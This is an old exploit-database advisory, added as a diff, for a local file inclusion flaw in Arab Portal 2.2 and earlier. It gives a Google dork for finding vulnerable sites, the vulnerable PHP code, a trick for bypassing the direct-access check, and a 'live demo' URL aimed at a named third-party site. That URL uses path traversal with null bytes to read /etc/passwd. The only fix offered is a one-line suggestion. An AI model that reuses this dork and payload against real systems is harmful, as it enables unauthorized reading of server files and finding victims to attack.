@@ -1,0 +1,81 @@
+                                            ||          ||   | ||
+                                     o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
+                                    (  :  /    (_)    /           (      .
+ 
+                                             ___________________
+                                           _/QQQQQQQQQQQQQQQQQQQ\__
+                                        __/QQQ/````````````````\QQQ\___
+                                      _/QQQQQ/                  \QQQQQQ\
+                                     /QQQQ/``                    ```QQQQ\
+                                    /QQQQ/                          \QQQQ\
+                                   |QQQQ/    By  Qabandi             \QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                                   |QQQQ|                            |QQQQ|
+                                   |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+                                    \QQQQ\                      __  /QQQQ/
+                                     \QQQQ\                    /QQ\_QQQQ/
+                                      \QQQQ\                   \QQQQQQQ/
+                                       \QQQQQ\                 /QQQQQ/_
+                                        ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                           ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                              ```````````````````     `````
+ 
+=Vuln:        Arab Portal <= 2.2 Local File Include Vulnerability
+=INFO:        http://www.ArabPortal.Info
+=BUY:          ---
+=Download:      ---
+=DORK:        "intitle:t3al shmeh"
+ 
+                                  ____________
+                              _-=/:Conditions:\=-_
+````````````````````````````````````````````````````````````````````````````````
+ 
+Magic_quotes MUST BE OFF
+Register Globals MUST BE ON
+The method used to bypass the "direct access" security works on some servers, not sure which ones exactly.
+ 
+---------------------------------------===--------------------------------------
+ 
+                                _________________
+                            _-=/:Vulnerable_Code:\=-_
+````````````````````````````````````````````````````````````````````````````````
+// in "modules/aljazeera/admin/setup.php"
+ 
+if (!eregi("mod.php", $PHP_SELF)) { die ("No Direct Access!"); }  <---- We can bypass by adding /mod.php end of the URL
+ 
+echo "<table border=0 width=80% cellspacing=2 cellpadding=6><tr>
+<td align=right class=datacell>
+<b>Welcome ...</b><br><br>";
+ 
+include("./../modules/$module/admin/information.php");
+ 
+//
+---------------------------------------===--------------------------------------
+ 
+                                     _______
+                                 _-=/:P.o.C:\=-_
+````````````````````````````````````````````````````````````````````````````````
+LIVE DEMO:
+http://a-shareef.com/modules/aljazeera/admin/setup.php/mod.php?module=../../../../../../etc////passwd%00Qabandi%00Was%00Here
+ 
+note: the module comes with the script by default.
+ 
+ 
+---------------------------------------===--------------------------------------
+ 
+                                    __________
+                                _-=/:SOLUTION:\=-_
+````````````````````````````````````````````````````````````````````````````````
+Use a diffrent method for direct access authentication.
+ 
+---------------------------------------===--------------------------------------
+ ______________________________________________________________________________
+/                                                                              \
+|      I%00REALY%00DONT%00GIVE%00A%00DAMN!                                     |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+                           Salamz to All Muslim Hackers. 
+
+# milw0rm.com [2009-08-03]
